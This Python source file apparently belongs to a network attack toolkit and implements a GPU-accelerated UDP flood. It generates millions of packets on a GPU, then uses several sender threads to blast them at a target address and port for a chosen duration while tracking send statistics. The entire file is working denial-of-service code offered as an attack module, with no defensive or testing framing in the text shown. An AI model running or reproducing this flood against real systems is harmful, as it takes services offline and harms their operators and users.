import time
import threading
import socket
from .base import AttackBase
from core.gpu_engine import GpuFloodWrapper, GPU_AVAILABLE


class GpuUdpFlood(AttackBase):
    """GPU-accelerated UDP flood with multi-threaded sending."""

    def __init__(self, *args, num_packets: int = 2_000_000, packet_size: int = 64,
                 send_threads: int = 8, **kwargs):
        super().__init__(*args, **kwargs)
        if not GPU_AVAILABLE:
            raise RuntimeError("GPU engine not available. Missing gpu_streamer.so")
        self.num_packets = num_packets
        self.packet_size = packet_size
        self.send_threads = send_threads
        self.engine = GpuFloodWrapper()
        self._stop_sending = threading.Event()
        self._sent_counter = 0
        self._counter_lock = threading.Lock()
        self._error_printed = False

    def start(self):
        self.stats["start_time"] = time.time()

        # 1. GPU generation
        print(f"[GPU] Generating {self.num_packets} packets...")
        kernel_time, copy_time = self.engine.generate_and_copy(self.num_packets, self.packet_size)
        print(f"[GPU] Kernel: {kernel_time*1000:.2f} ms, Copy: {copy_time*1000:.2f} ms")

        # 2. Get CPU buffer (as bytes)
        cpu_buf = bytes(self.engine.get_cpu_buffer())
        expected_len = self.num_packets * self.packet_size
        if len(cpu_buf) != expected_len:
            print(f"[!] Buffer size mismatch: got {len(cpu_buf)}, expected {expected_len}")
            return self.stats

        # 3. Quick connectivity test (optional)
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            test_sock.sendto(cpu_buf[:self.packet_size], (self.target, self.port))
            test_sock.close()
        except Exception as e:
            print(f"[!] Warning: test packet failed: {e}")

        # 4. Launch sender threads
        chunk_size = self.num_packets // self.send_threads
        threads = []
        for i in range(self.send_threads):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < self.send_threads - 1 else self.num_packets
            t = threading.Thread(target=self._send_chunk, args=(cpu_buf, start_idx, end_idx))
            t.daemon = True
            t.start()
            threads.append(t)

        # 5. Start stats monitor
        self._start_monitor()

        # 6. Wait for attack duration
        time.sleep(self.duration)

        # 7. Stop and collect final counts
        self._stop_sending.set()
        for t in threads:
            t.join(timeout=1.0)
        self._stop_monitor()

        with self._counter_lock:
            final_sent = self._sent_counter
        self.stats["end_time"] = time.time()
        self.stats["requests"] = final_sent
        self.stats["bytes_sent"] = final_sent * self.packet_size
        return self.stats

    def _send_chunk(self, cpu_buf: bytes, start_idx: int, end_idx: int):
        """Send packets in a tight loop."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dest = (self.target, self.port)
        packet_size = self.packet_size
        local_sent = 0
        idx = start_idx

        while not self._stop_sending.is_set():
            offset = idx * packet_size
            chunk = cpu_buf[offset:offset + packet_size]
            try:
                sock.sendto(chunk, dest)
                local_sent += 1
                # Update global counter every 500 packets
                if local_sent % 500 == 0:
                    with self._counter_lock:
                        self._sent_counter += 500
            except Exception as e:
                if not self._error_printed:
                    with self._counter_lock:
                        if not self._error_printed:
                            print(f"[!] Send error (only shown once): {e}")
                            self._error_printed = True
                # Continue despite errors
            idx += 1
            if idx >= end_idx:
                idx = start_idx

        # Flush remainder
        remainder = local_sent % 500
        if remainder:
            with self._counter_lock:
                self._sent_counter += remainder
        sock.close()

    def _start_monitor(self):
        self._monitor_running = True
        self._monitor_thread = threading.Thread(target=self._monitor_loop)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()

    def _stop_monitor(self):
        self._monitor_running = False
        if hasattr(self, '_monitor_thread') and self._monitor_thread:
            self._monitor_thread.join(timeout=1)

    def _monitor_loop(self):
        """Update stats for CLI every second."""
        last = 0
        while self._monitor_running:
            time.sleep(1.0)
            with self._counter_lock:
                current = self._sent_counter
            with self.lock:
                self.stats["requests"] = current
                self.stats["bytes_sent"] = current * self.packet_size
            last = current

    def worker(self) -> int:
        return 0